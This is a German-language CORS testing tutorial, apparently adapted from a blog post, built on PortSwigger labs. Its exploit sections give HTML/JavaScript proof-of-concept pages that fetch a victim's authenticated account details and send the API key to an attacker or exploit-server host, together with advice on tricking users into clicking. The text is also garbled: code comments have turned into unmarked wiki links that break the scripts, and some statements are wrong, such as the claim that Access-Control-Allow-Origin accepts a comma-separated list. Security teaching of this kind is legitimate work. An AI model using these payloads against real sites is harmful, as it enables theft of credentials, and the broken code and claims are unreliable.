>Identifizieren von [[CORS-Schwachstellen]]: Häufige Angriffsvektoren und 
>Abwehrstrategien

Alle Webbrowser implementieren ein Sicherheitsmodell namens [[Same-Origin Policy]] (SOP), das Domänen daran hindert, auf die Ressourcen anderer Domänen zuzugreifen und Daten von diesen abzurufen. Die SOP-Richtlinie trägt dazu bei, Benutzer vor bösartigen Skripten zu schützen, die auf ihre sensiblen Daten zugreifen oder in ihrem Namen unbefugte Aktionen ausführen könnten.  
  
Wenn beispielsweise thebusiness.com versucht, eine [[HTTP-Anfragen]] an themetrics.com zu stellen, blockiert der Browser die Anfrage standardmäßig, da sie von einer anderen Domäne stammt.  
  
Auch wenn sich die SOP nach einer geeigneten Schutzrichtlinie anhört, lässt sie sich nicht gut mit den heutigen Technologien kombinieren, deren Betrieb voneinander abhängt, wie beispielsweise APIs und Microservices, die legitime Anwendungsfälle für den Zugriff auf und den Austausch von Informationen zwischen Domänen haben.  
  
Und dafür war ein neuer Sicherheitsmechanismus erforderlich, der domänenübergreifende Interaktionen ermöglichen würde, bekannt als [[Cross-Origin Resource Sharing]] ([[CORS]]).  
  
In diesem Artikel werden die Grundlagen der Funktionsweise von [[CORS]] behandelt und häufige Schwachstellen identifiziert, die auftreten können, wenn [[CORS]] nicht korrekt implementiert wird. Wir werden auch lernen, wie man die Fehlkonfigurationen testet und ausnutzt, sodass wir am Ende dieses Leitfadens ein besseres Verständnis dafür haben, wie man [[CORS]] während einer Pentest-Bewertung testet und validiert.  
  
Ich werde die [[CORS]]-Labore von Port Swigger nutzen, um die Test- und Ausnutzungsschritte zu demonstrieren.

## Cross-Site Origin Policy ([[CORS]])
[[CORS]] ist eine Sicherheitsfunktion, die entwickelt wurde, um die SOP-Einschränkungen selektiv zu lockern und einen kontrollierten Zugriff auf Ressourcen aus verschiedenen Domänen zu ermöglichen. Mit [[CORS-Regeln]] können Domänen angeben, welche Domänen Informationen von ihnen anfordern können, indem sie der Antwort bestimmte [[HTTP-Header]] hinzufügen.  
  
Es gibt mehrere [[HTTP-Header]] im Zusammenhang mit [[CORS]]; Uns interessieren jedoch die beiden Schwachstellen, die häufig auftreten: Access-Control-Allow-Origin und Access-Control-Allow-Credentials.

- Access-Control-Allow-Origin: Dieser Header gibt die zulässigen Domänen zum Lesen des Antwortinhalts an. Der Wert kann entweder ein Platzhalterzeichen (*) sein, das angibt, dass alle Domänen zulässig sind, oder eine durch Kommas getrennte Liste von Domänen.

```http
[[All]] domain are allowed  
Access-Control-Allow-Origin: *  

[[comma-separated]] list of domains  
Access-Control-Allow-Origin: example.com, metrics.com
```

- Access-Control-Allow-Credentials: Dieser Header bestimmt, ob die Domäne die Weitergabe von Anmeldeinformationen – wie [[Cookies]] oder Autorisierungsheadern in den Cross-Origin-Anfragen – zulässt.

Der Wert des Headers ist entweder True oder False. Wenn der Header auf „true“ gesetzt ist, erlaubt die Domäne das Senden von Anmeldeinformationen, und wenn er auf „false“ gesetzt ist oder nicht in der Antwort enthalten ist, ist dies nicht zulässig.

```http
[[allow]] passing credenitals in the requests  
Access-Control-Allow-Credentials: true  
  
[[Disallow]] passing in the requests  
Access-Control-Allow-Credentials: false
```

## Impact
[[CORS-Fehlkonfigurationen]] können erhebliche Auswirkungen auf die Sicherheit von Webanwendungen haben. Nachfolgend sind die wichtigsten Auswirkungen aufgeführt:

- Datendiebstahl: Angreifer können CORS-Schwachstellen nutzen, um sensible Daten aus Anwendungen wie [[API-Schlüsseln]], SSH-Schlüsseln, personenbezogenen Daten (PII) oder Anmeldeinformationen von Benutzern zu stehlen.
- Cross-Site Scripting (XSS): Angreifer können [[CORS-Schwachstellen]] nutzen, um XSS-Angriffe durchzuführen, indem sie bösartige Skripts in Webseiten einschleusen, um Sitzungstoken zu stehlen oder nicht autorisierte Aktionen im Namen des Benutzers durchzuführen.
- In einigen Fällen Remote-Codeausführung (StackStorm-Fall)

## Identifying [[CORS]]
Beim Testen einer Anwendung auf [[CORS]] prüfen wir, ob eine der Antworten der Anwendung die [[CORS-Header]] enthält. Wir können die Suchfunktion in Burp Suite verwenden, um schnell nach den Headern zu suchen.

Im folgenden Beispiel habe ich nach dem Header „Access-Control-Allow-Credentials“ gesucht und drei (3) Antworten erhalten. Sobald die Header identifiziert sind, wählen wir die Anfragen aus und senden sie zur weiteren Analyse an Repeater.

Um [[CORS]]-Probleme zu identifizieren, ändern wir den Origin-Header in den Anfragen mit mehreren Werten und sehen, welche Antwortheader wir von der Anwendung zurückbekommen. Es gibt vier 4 bekannte Möglichkeiten, dies zu tun:

### 1. Reflected Origins
Legen Sie den Origin-Header in der Anfrage auf eine beliebige Domäne fest, z. B. https://attackersdomain.com, und überprüfen Sie den Access-Control-Allow-Origin-Header in der Antwort. Wenn es genau die Domäne widerspiegelt, die Sie in der Anfrage angegeben haben, bedeutet dies, dass die Domäne nicht nach Ursprüngen gefiltert wird.

Das Risiko dieser Fehlkonfiguration ist hoch, wenn die Domäne die Weitergabe von Anmeldeinformationen in den Anforderungen zulässt. Wir können dies überprüfen, indem wir prüfen, ob der Header „Access-Control-Allow-Credentials“ auch in der Antwort enthalten und auf „true“ gesetzt ist.  
Das Risiko ist jedoch gering, wenn die Weitergabe von Anmeldeinformationen nicht zulässig ist, da der Browser die Antworten authentifizierter Anfragen nicht verarbeitet.

### 2. Modified Origins
Legen Sie den Origin-Header auf einen Wert fest, der mit der Zieldomäne übereinstimmt, fügen Sie der Domäne jedoch ein Präfix oder Suffix hinzu, um zu prüfen, ob am Anfang oder Ende der Domäne eine Validierung erfolgt.  
  
Wenn keine Prüfungen vorhanden sind, können wir eine ähnliche passende Domäne erstellen, die die [[CORS-Richtlinien]] für die Zieldomäne umgeht. Das Hinzufügen eines Präfixes oder Suffixes zur Domäne „metrics.com“ würde beispielsweise etwa „attachmetrics.com“ oder „metrics.com.attack.com“ lauten.  
  
Das Risiko dieser Fehlkonfiguration wird als hoch eingestuft, wenn die Domäne die Weitergabe von Anmeldeinformationen zulässt, wobei der Header „Access-Control-Allow-Credentials“ auf „true“ gesetzt ist, da der Angreifer eine ähnliche passende Domäne erstellen und vertrauliche Informationen von der Zieldomäne abrufen kann.  
  
Allerdings wäre das Risiko gering, wenn authentifizierte Anfragen nicht zugelassen würden.

### 3. Trusted subdomains with Insecure Protocol.
Setzen Sie den Origin-Header auf eine vorhandene Subdomain und prüfen Sie, ob diese akzeptiert wird. Wenn dies der Fall ist, bedeutet dies, dass die Domäne allen ihren Subdomänen vertraut. Dies ist keine gute Idee, denn wenn eine der Subdomains eine Cross-Site-Scripting-Schwachstelle (XSS) aufweist, kann der Angreifer eine schädliche JS-Nutzlast einschleusen und unberechtigte Aktionen ausführen Aktionen.  
  
Diese Fehlkonfiguration gilt als hohes Risiko, wenn die Domäne Subdomänen mit einem unsicheren Protokoll wie [[HTTP]] akzeptiert und der Anmeldeinformationsheader auf „true“ gesetzt ist. Andernfalls ist es nicht ausnutzbar und wäre nur eine schlechte [[CORS-Implementierung]].

### 4. Null Origin
Setzen Sie den Origin-Header auf den Nullwert – Origin: null, und prüfen Sie, ob die Anwendung den Access-Control-Allow-Origin-Header auf Null setzt. Wenn dies der Fall ist, bedeutet dies, dass Nullursprünge auf der Whitelist stehen.  
  
Die Risikostufe gilt als hoch, wenn die Domäne authentifizierte Anforderungen zulässt und der Header „Access-Control-Allow-Credentials“ auf „true“ gesetzt ist.  
  
Ist dies jedoch nicht der Fall, gilt das Problem als gering und nicht ausnutzbar.

## Exploitable [[CORS]] Cases
>In diesem Abschnitt gehen wir auf die Ausnutzung der [[CORS-Fehlkonfigurationen]] ein, indem wir sie zum leichteren Verständnis in Testfälle kategorisieren.

### 1. Reflected Origin
Die Anwendung gilt als anfällig, wenn sie „Access-Control-Allow-Origin“ auf die vom Angreifer angegebene Domäne setzt und die Weitergabe von Anmeldeinformationen ermöglicht, wobei „Access-Control-Allow-Credentials“ auf „true“ gesetzt ist.

```http
Access-Control-Allow-Origin: http://attacker-domain.com  
Access-Control-Allow-Credentials: true
```

Für die Ausnutzung muss der Angreifer das JS-Skript auf einem externen Server hosten, damit der Benutzer darauf zugreifen kann. Erstellen Sie dann eine HTML-Seite, betten Sie das JS-Skript unten ein und senden Sie es an den Benutzer.

```javascript
<html>  
	<body>  
		<script>  
		  
			[[Initialize]] the XMLHttpRequest object, and the application URL vairable  
			var req = new XMLHttpRequest();  
			var url = ("APPLICATION URL");  
			  
			[[MLHttpRequest]] object loads, exectutes reqListener() function  
			req.onload = retrieveKeys;  
			  
			[[Make]] GET request to the application accounDetails location  
			req.open('GET', url + "/accountDetails",true);  
			  
			[[Allow]] passing credentials with the requests  
			req.withCredentials = true;  
			  
			[[Send]] the request  
			req.send(null);  
			  
			function retrieveKeys() {  
			location='/log?key='+this.responseText;  
			};  
		  
		</script>  
	<body>  
</html>
```

Sobald der Benutzer Ihre gehostete Seite besucht, sendet er automatisch eine [[CORS-Anfrage]], um Informationen über den Benutzer von dem im Skript angegebenen Ort abzurufen. Für diesen Schritt ist es wichtig, die Anwendungsstruktur und den Speicherort sensibler Informationen zu verstehen.  
  
Das obige Skript beginnt mit der Initialisierung des XMLHttpRequest (XHR)-Objekts, um den Webbrowser anzuweisen, dass wir Daten mithilfe des [[HTTP-Protokolle]] von und zu einem Webserver übertragen. XHR ist eine Browser-[[API]], die es clientseitigen Skriptsprachen wie JavaScript ermöglicht, [[HTTP-Anfragen]] an einen Server zu stellen und deren Antworten dynamisch zu empfangen, ohne dass der Benutzer die Seite aktualisieren muss.  
  
Anschließend weisen wir das Objekt an, eine Funktion namens „retrieKeys“ auszuführen, die den [[Admin-API-Schlüssel]] abruft und die Antwort beim Laden an uns sendet.  
  
Als Nächstes stellen wir eine GET-Anfrage, in der wir den Speicherort angeben, von dem wir Informationen abrufen möchten, und übergeben unsere Anmeldeinformationen, wobei die Funktion „Credentials“ auf „true“ gesetzt ist.  
  
Die Anfrage wird automatisch blockiert und abgelehnt, wenn der Anwendungsserver die Weitergabe von Anmeldeinformationen zwischen Domänen nicht zulässt. Wir wissen jedoch, dass dies hier nicht passieren wird, da die access-Control-Allow-Credentials auf true gesetzt sind.  
  
Um zu demonstrieren, wie das Skript funktioniert, verwende ich den Exploit-Server, den PortSwigger im Labor zur Verfügung stellt, um das obige Skript zu hosten.  
  
Melden Sie sich bei der Anwendung an, klicken Sie auf „Zum Exploit-Server gehen“ und fügen Sie das Skript in den Text ein. Klicken Sie dann auf „Exploit an Opfer liefern“. In einem realen Szenario müssen Sie den Link an den Benutzer senden und versuchen, ihn zum Klicken zu verleiten.

Nachdem Sie den Exploit bereitgestellt haben, klicken Sie auf „Zugriffsprotokoll“. Wir sollten den [[API-Schlüssel]] des erfassten Administrators in den Protokollen sehen können. Kopieren Sie die Zeichenfolge mit dem Schlüssel, fügen Sie sie in Burp Suite Decoder ein und dekodieren Sie sie als [[URL (Uniform Resource Locator)]], um den Klartextwert abzurufen.

### 2. Null Origin
Die Anwendung gilt als anfällig, wenn sie Access-Control-Allow-Origin auf den Nullwert setzt und die Weitergabe von Anmeldeinformationen ermöglicht, während Access-Control-Allow-Credentials auf „true“ gesetzt ist.

```http
Access-Control-Allow-Origin: null  
Access-Control-Allow-Credentials: true
```

Die Ausnutzung erfordert, dass wir die JS-Skriptdatei hosten, damit sie für den Zielbenutzer zugänglich ist (wie in Fall Nr. 1). Auch hier werden wir dasselbe Skript verwenden; Dieses Mal werden wir eine Iframe-Sandbox hinzufügen, um den [[API-Schlüssel]] abzurufen. Die Sandbox-Eigenschaft setzt den Ursprung des Frames auf Null, sodass wir den Origin-Header auf den Nullwert setzen können.

```javascript
<html>  
<body>  
<iframe style="display: none;" sandbox="allow-scripts" srcdoc="  
<script>  
var req = new XMLHttpRequest();  
var url = 'APPLICATION URL'  
req.onload = retrieveKeys;  
  
req.open('GET', url + '/accountDetails', true);  
req.withCredentials = true;  
req.send(null);  
  
function retrieveKeys() {  
fetch('https://Exolit_Server_Hostname/log?key=' + req.responseText)  
}  
</script>"></iframe>  
</body>  
</html>
```

Wenn der authentifizierte Benutzer auf unseren Link http://192.168.1.14:5555/cors_null_poc.html klickt, erhalten wir den [[API-Schlüssel]] aus den Kontodetails. Da unser Benutzer jedoch kein Administrator ist, können wir den [[Administrator-API-Schlüssel]] nicht abrufen.  
  
Der Zweck der Darstellung der folgenden Schritte besteht darin, dass Sie als Tester während einer Webanwendungstestbewertung Administrator- und reguläre Benutzerkonten zum Testen erhalten. In diesem Fall befolgen Sie die folgenden Schritte, um Ihren Proof of Concept durch Hosting zu zeigen die Datei lokal. Alternativ können Sie die Datei natürlich auch extern hosten.

### 3. Trusted Subdomains
Die Anwendung gilt als anfällig, wenn sie Access-Control-Allow-Origin auf eine ihrer Subdomänen setzt und Anmeldeinformationen zulässt, wobei Access-Control-Allow-Credentials auf „true“ gesetzt ist.  
  
Die Ausnutzung dieses Falles hängt davon ab, ob die vorhandene Subdomain anfällig für eine XSS-Schwachstelle ist, damit der Angreifer die Fehlkonfiguration missbrauchen kann.

```http
Access-Control-Allow-Origin: subdomainattacker.example.com  
Access-Control-Allow-Credentials: true
```

Wenn Sie auf dieses Szenario stoßen, müssen Sie alle vorhandenen Subdomains überprüfen und versuchen, eine mit einer XSS-Schwachstelle zu finden, um diese auszunutzen.

Wir werden dasselbe Skript verwenden, um diesen Fall auszunutzen, außer dass wir den Speicherort hinzufügen, an dem wir die Nutzlast mithilfe der Funktion document.location einfügen. Dann formatieren wir die Nutzlast als einzeilige Nutzlast, damit wir sie im Parameter übergeben können.

```javascript
<script>  
	document.location="http://subdomain.domain.com/?productId=<script>  
<script>  
var req = new XMLHttpRequest();  
req.onload = retrieveKeys;  
req.open('GET', "APPLICATION URL/accountDetails",true);  
req.withCredentials = true;  
req.send(null);  
  
function retrieveKeys() {  
location='https://Exolit_Server_Hostname/log?key='+this.responseText;  
};  
  
</script>  
</script>
```

```javascript
<script>  
document.location="http://Insecure-subdomain/?productId=<script>var req = new XMLHttpRequest(); req.onload = retrieveKeys; req.open('get','APPLICATION URL/accountDetails',true); req.withCredentials = true;req.send();function retrieveKeys() {location='https://exploit-0a110003034945dec57758a8018500a8.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"  
</script>
```

Danach speichern wir das Skript als cors_poc.html, hosten es auf unserem Server und senden den Link an den Benutzer.

```javascript
<html>  
<body>  
<script>  
document.location="http://Insecure-subdomain/?productId=<script>var req = new XMLHttpRequest(); req.onload = retrieveKeys; req.open('get','APPLICATION URL/accountDetails',true); req.withCredentials = true;req.send();function retrieveKeys() {location='https://exploit-0a110003034945dec57758a8018500a8.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"  
</script>  
</body>  
</html>
```

Wie in den Screenshots unten zu sehen ist, hat das Skript beim Zugriff des Benutzers auf den Link die Nutzlast in den Parameter „productId“ eingefügt und den [[API-Schlüssel]] abgerufen.

### 3. Unexploitable Case: Wild Card (*)
Die Anwendung ist ***NICHT*** angreifbar, wenn Access-Control-Allow-Origin auf Wildcard * gesetzt ist, selbst wenn der Header Access-Control-Allow-Credentials auf true gesetzt ist. Der Grund dafür ist, dass eine Sicherheitsüberprüfung vorhanden ist, die den Allow-Credentials-Header deaktiviert, wenn der Ursprung auf einen Platzhalter gesetzt ist.

#### Mitigations
- Implementieren Sie geeignete [[CORS-Header]]: Der Server kann geeignete [[CORS-Header]] hinzufügen, um ursprungsübergreifende Anforderungen nur von vertrauenswürdigen Sites zuzulassen.
- Beschränken Sie den Zugriff auf sensible Daten: Es ist wichtig, den Zugriff auf sensible Daten nur auf vertrauenswürdige Domänen zu beschränken. Dies kann durch die Implementierung von Zugriffskontrollmaßnahmen wie [[Authentifizierung]] und Autorisierung erreicht werden.

##### Website
https://medium.com/r3d-buck3t/cross-origin-resource-sharing-cors-testing-guide-29616c225a0a